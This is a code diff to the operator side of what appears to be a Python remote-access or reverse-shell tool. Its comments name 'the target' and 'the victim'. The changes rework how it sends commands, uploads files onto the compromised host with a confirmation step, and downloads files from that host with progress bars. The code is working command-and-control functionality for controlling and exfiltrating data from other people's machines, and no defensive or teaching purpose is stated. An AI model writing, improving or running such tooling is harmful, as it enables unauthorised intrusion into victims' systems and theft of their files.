@@ -25,31 +25,42 @@ def handle_command(client_socket):
             # For regular commands, print the output received from the target
             output = client_socket.recv(4096).decode()
             print(output)
+
  #Upload Function
 def upload_file(client_socket):
 
  #Input the file name
- filename = input("Input the Filename: ")
- client_socket.send(filename.encode('utf-8'))
+ filename = input("Input the Filename to be uploaded: ")
+
 
  if os.path.exists(filename):
-
+     #Send the file name to the target
+     client_socket.send(filename.encode('utf-8'))
      # Get the size of the file
      file_size = os.path.getsize(filename)
+
      print(f"Sending file: {filename} of size {file_size} bytes")
 
      # Send the file size to the victim
      client_socket.sendall(str(file_size).encode('utf-8'))
+
+     test = input("Press y to start upload the function: ")
+     client_socket.send(test.encode('utf-8'))
+
+
+
      with open(filename, 'rb') as file:
          bytes_sent = 0
+         chunk = file.read(1024)
          with tqdm(total=file_size, unit='B', unit_scale=True, desc=f"Sending {filename}") as pbar:
-             while bytes_sent < file_size:
-                 chunk = file.read(1024)
+            while chunk:
                  client_socket.sendall(chunk)
+                 chunk = file.read(1024)
                  bytes_sent += len(chunk)
                  pbar.update(len(chunk))
+
          print(f"File '{filename}' sent successfully. Total bytes sent: {bytes_sent}")
-         handle_command(client_socket)
+     handle_command(client_socket)
 
  else:
      print("File not found!")
@@ -72,7 +83,7 @@ def receive_file(client_socket):
         bytes_received = 0
 
         with open(filename, 'wb') as file:  # Open the file to save it locally
-         with tqdm(total=file_size, unit='B', unit_scale=True, desc=f"Uploading {filename}") as pbar:
+         with tqdm(total=file_size, unit='B', unit_scale=True, desc=f"Downloading {filename}") as pbar:
             while bytes_received < file_size:
                chunk = client_socket.recv(1024)
 
